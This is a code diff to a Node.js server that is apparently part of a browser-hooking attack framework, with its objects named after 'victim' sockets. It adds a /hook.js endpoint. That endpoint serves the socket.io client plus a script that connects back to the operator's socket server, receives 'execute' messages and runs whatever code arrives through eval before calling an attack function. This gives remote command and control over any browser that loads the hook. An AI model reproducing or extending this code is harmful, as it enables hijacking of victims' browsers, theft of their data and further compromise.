@@ -7,8 +7,9 @@ const http          = require('http'),
         resave: true,
         saveUninitialized: true
       }),
-      victimIoSession = require("express-socket.io-session")
-
+      victimIoSession = require("express-socket.io-session"),
+      fs              = require('fs'),
+      socketIOClient  = fs.readFileSync('./public/socket-io.js')
 
 /*
   Configure Victim Sockets
@@ -27,6 +28,11 @@ victimApp.use(function(req, res, next) {
   return next();
 })
 victimApp.use(express.static(__dirname + '/public'))
+victimApp.get('/hook.js', function(req, res){
+  res.write(socketIOClient)
+  res.write(`(function(){const socket = io('http://${process.env.VICTIM_SOCKET_IP}:${process.env.VICTIM_SOCKET_PORT}');socket.on('execute',function(data){eval(data.func);attack(data.params);});})();`)
+  res.end()
+})
 victimServer.listen( process.env.VICTIM_SOCKET_PORT)
 console.log(`Victim socket server listening on :${process.env.VICTIM_SOCKET_PORT}`)
 
